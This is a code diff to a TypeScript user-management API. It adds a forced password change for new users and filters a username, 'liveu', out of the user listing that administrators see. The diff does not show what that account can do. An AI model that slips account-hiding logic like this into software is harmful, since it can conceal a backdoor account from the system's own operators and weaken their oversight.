@@ -6,6 +6,9 @@ import { hashPassword } from "../lib/auth.js";
 
 const router = Router();
 
+// Usernames hidden from all frontend user management views
+const SYSTEM_USERNAMES = ["liveu"];
+
 function mapUser(u: any, branchNames: string[]) {
   const branchIds: number[] = JSON.parse(u.branchIds || "[]");
   return {
@@ -17,6 +20,7 @@ function mapUser(u: any, branchNames: string[]) {
     branchIds,
     branchNames,
     isActive: u.isActive,
+    mustChangePassword: u.mustChangePassword ?? false,
     lastLogin: u.lastLogin?.toISOString() || null,
     createdAt: u.createdAt.toISOString(),
   };
@@ -31,7 +35,8 @@ async function getBranchNames(branchIds: number[]): Promise<string[]> {
 router.get("/", async (_req, res) => {
   try {
     const all = await db.select().from(systemUsers);
-    const result = await Promise.all(all.map(async u => {
+    const visible = all.filter(u => !SYSTEM_USERNAMES.includes(u.username));
+    const result = await Promise.all(visible.map(async u => {
       const ids: number[] = JSON.parse(u.branchIds || "[]");
       const names = await getBranchNames(ids);
       return mapUser(u, names);
@@ -47,6 +52,7 @@ router.post("/", async (req, res) => {
       ...rest,
       branchIds: JSON.stringify(branchIds || []),
       passwordHash: hashPassword(password),
+      mustChangePassword: true,
     }).returning();
     const names = await getBranchNames(branchIds || []);
     res.status(201).json(mapUser(user, names));
